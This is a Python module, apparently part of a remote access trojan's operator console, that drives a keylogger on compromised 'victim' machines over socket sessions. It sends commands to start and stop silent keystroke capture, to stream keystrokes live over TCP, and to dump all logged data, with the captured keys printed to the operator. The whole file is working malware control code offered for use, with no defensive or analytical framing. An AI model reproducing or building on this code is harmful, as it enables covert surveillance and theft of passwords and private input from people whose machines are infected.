import threading
import time
from .handler import Handler
#from .other import XOREncryption
from .other import printColor
from .other import printAllTarget
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT, SPLIT 
from .management import CheckConn

class Keylogger:

    status_directTcp = True

    def __init__(self, session_nb):

        self.session_nb = session_nb
        Keylogger.status_directTcp = True


    def help(self):
        '''-h or --help'''
        printColor("help","""
-h or --help : Displays all session mode commands.

-ls or --list : Displays all clients with their information.

--direct : 
 
--start : 

--stop : 

--dump : 

-b or --back : Back to menu.
""") 


    def recvThread(self):
        #receives the keyboard keys entered by the victim 

        while Keylogger.status_directTcp:

            keystroke = CheckConn().recvsafe(Handler.dict_conn[self.session_nb ][NB_SOCKET],64,False)
            if not (keystroke):
                #if error
                break
            else:
               printColor("successfully", keystroke,True)


    def directTcp(self):
        #Launches a thread to listen to keystrokes,
        #Send "\r\n" to signal the customer to stop the mod keylogger.
        printColor("information", "[?] Press CTRL+c to return to MOD KEYLOGGER.\n\n")
        Keylogger.status_directTcp = True
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:direct_tcp")):
            
            recv_thread = threading.Thread(target=self.recvThread)
            recv_thread.start()
            
            checker = True
            try:
                while checker:
                    time.sleep(120)
            except KeyboardInterrupt:
                checker = False
            
            Keylogger.status_directTcp = False
            recv_thread.join()
            CheckConn().sendsafe(self.session_nb, Handler.dict_conn[self.session_nb][NB_SOCKET], "\r\n")
            
            print("\n")
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")

    
    def sendStartorStop(self, data):
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], data)):
            #CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
            printColor("successfully", "[+] The mod has been sent.")
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")

    
    def dumpAllData(self):
        if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:dump_all")):
            CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
            #printColor("successfully", "[+] The mod has been sent.")
        else:
            printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")


    def main(self):
        
        printColor("help","\n[?] Run -b or --back to return to the SESSION MOD.")
        printColor("help","[?] Run -h or --help to list the available commands.\n")
        checker = True                                   
        while Handler.dict_conn[self.session_nb][NB_ALIVE] and checker:
            terminal = str(input(str("keylogger")+">"))

            if terminal == "-h" or terminal == "--help":
                self.help()
            
            elif terminal == "-ls" or terminal == "--list":
                printAllTarget()

            elif terminal == "--direct":
                self.directTcp()

            elif terminal == "--start":
                self.sendStartorStop("MOD_KEYLOGGER:start_silencious")
            
            elif terminal == "--stop":
                self.sendStartorStop("MOD_KEYLOGGER:stop_silencious")

            elif terminal == "--dump":
                self.dumpAllData()

            elif terminal == "-b" or terminal == "--back":
                checker = False
            
            else:
                pass

        